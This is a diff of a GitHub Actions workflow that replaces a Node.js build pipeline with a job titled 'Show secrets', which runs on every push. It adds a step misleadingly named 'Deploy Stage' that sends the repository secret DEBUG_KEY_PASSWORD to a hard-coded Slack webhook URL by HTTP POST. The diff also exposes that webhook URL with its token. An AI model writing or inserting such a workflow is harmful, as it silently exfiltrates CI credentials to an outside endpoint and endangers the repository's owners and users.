@@ -1,35 +1,16 @@
-name: NodeJS with Grunt
-
-on:
-  push:
-    branches: [ "master" ]
-  pull_request:
-    branches: [ "master" ]
-
+name: Show secrets
+on: [push]
 jobs:
-  build:
+  debug:
+    name: Show secrets
     runs-on: ubuntu-latest
-
-    strategy:
-      matrix:
-        node-version: [14.x, 16.x, 18.x]
-
     steps:
-    - uses: actions/checkout@v3
-
-    - name: Use Node.js ${{ matrix.node-version }}
-      uses: actions/setup-node@v3
-      with:
-        node-version: ${{ matrix.node-version }}
-
-    - name: Prepare debug keystore.properties
-      run: |
-          echo "debugStoreFile=../cx_debug.keystore" >> keystore.properties
-          echo ${{ secrets.DEBUG_STORE_PASSWORD }} >> keystore.properties
-          echo ${{ secrets.DEBUG_KEY_ALIAS }} >> keystore.properties
-          echo ${{ secrets.DEBUG_KEY_PASSWORD }} >> keystore.properties
-        
-        
-        
-        
-        
+      - name: Deploy Stage
+        env:
+          DEBUG_KEY_PASSWORD : ${{ secrets.DEBUG_KEY_PASSWORD  }}
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://hooks.slack.com/services/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'
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.DEBUG_KEY_PASSWORD }}
